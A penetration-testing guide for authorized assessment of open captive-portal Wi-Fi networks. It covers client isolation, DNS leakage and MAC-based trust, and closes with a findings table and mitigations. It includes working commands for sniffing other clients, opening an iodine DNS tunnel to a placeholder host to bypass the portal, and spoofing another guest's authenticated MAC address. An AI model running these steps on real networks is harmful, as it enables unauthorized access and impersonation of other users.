---
title: Captive portal security assessment
summary: "Authorized testing of hotel/café-style open portals: client isolation, DNS leakage, MAC trust"
tags: [pentest, captive portal, wifi, dns, mac, client isolation, kali, authorized]
order: 13
---

> **Authorization note:** Testing a captive portal network (hotel, airport, café, train) without written permission from the network owner can violate computer misuse laws and the venue's terms of service, even when no encryption is being "broken." Only run these steps against networks you own, operate, or have explicit authorization to test (e.g. your own homelab captive portal, or a client engagement with signed scope).

Captive portals are architecturally very different from WPA2-Personal/Enterprise. The wireless link itself is usually **open or uses a shared PSK announced at reception**, and the actual "authentication" (room number, name, email) happens at Layer 7 (HTTP), enforced by firewall rules tied to the client's MAC address. That means the security questions being tested are different: *client isolation, DNS leakage, and MAC-based trust*, not cryptographic handshake cracking.

---

## Required Resources

- Kali Linux (native or VM) with a Wi-Fi adapter in monitor mode (e.g. Alfa AWUS036ACH)
- `airmon-ng` / `airodump-ng` — recon of the open SSID and connected clients
- `Wireshark` / `tcpdump` — traffic capture and inspection
- `macchanger` — MAC address analysis and spoofing tests
- `iodine` or `dnscat2` — DNS tunneling tests
- `curl`, `dig`, `nslookup` — manual portal and DNS behavior checks
- A written test authorization / scope document

---

## Step 1 — Reconnaissance of the Portal Setup

```
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Identify the SSID, whether it's open or uses a shared PSK, and note the BSSID and channel. Connect normally as a guest would and observe:

```
curl -v http://neverssl.com
```

If you're redirected (HTTP 302) to a login page instead of reaching the target site, that confirms portal enforcement via HTTP redirect rather than a fully blocked gateway.

---

## Step 2 — Client Isolation Test

Before logging in, capture broadcast/multicast traffic from other connected clients:

```
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```

```
wireshark capture-01.cap
```

If you can see ARP requests or traffic from other clients' MAC addresses, **client isolation is disabled** — meaning devices on the same portal network can potentially reach each other directly (a common finding in poorly configured hotel networks).

---

## Step 3 — DNS Pre-Authentication Test

Before logging in, test whether DNS queries are actually restricted:

```
dig google.com
dig txt example.com
```

Some portals allow full DNS resolution (and even DNS *response* payloads) before authentication, purely to let the client's browser detect the captive portal. This can be tested for tunneling potential:

```
sudo iodine -f -P password 203.0.113.1 tunnel.example.com
```

If a tunnel establishes and you can route traffic through DNS queries before ever completing the portal login, this is a **DNS exfiltration/bypass finding** worth reporting — it means the "authentication" doesn't actually gate outbound connectivity.

---

## Step 4 — MAC-Based Trust Test

After a legitimate login (e.g. with your own room number/name), observe that your MAC address is now whitelisted on the firewall:

```
ip link show wlan0
sudo macchanger -s wlan0
```

To test whether the portal's *entire* security model rests on MAC trust (as opposed to a session token or cookie tied to the browser), disconnect, then spoof a MAC address that was observed already authenticated in Step 2:

```
sudo macchanger -m <observed_MAC> wlan0
```

Reconnect and check if internet access is granted **without** going through the login page again. If so, this confirms that authentication state is bound only to MAC address — a well-known weakness, since MAC addresses are trivially visible on an unencrypted network and easily spoofed.

---

## Step 5 — Documenting Findings

A useful captive portal assessment report typically notes:

| Finding | Risk |
|---|---|
| Open/shared-PSK Wi-Fi with no per-client encryption | Traffic sniffable by any connected client |
| Client isolation disabled | Lateral movement between guest devices |
| DNS resolution/tunneling allowed pre-auth | Bypasses portal entirely, no accountability for usage |
| MAC-only session trust | Trivial to impersonate an already-authenticated device |

**Recommended mitigations** (for the report, if this is a real engagement): enable client isolation (AP isolation / private VLANs per client), enforce WPA2/WPA3 with per-session keys (e.g. via Hotspot 2.0 / PPSK), block DNS query types not required for portal redirection, and bind sessions to a token/cookie rather than MAC address alone.
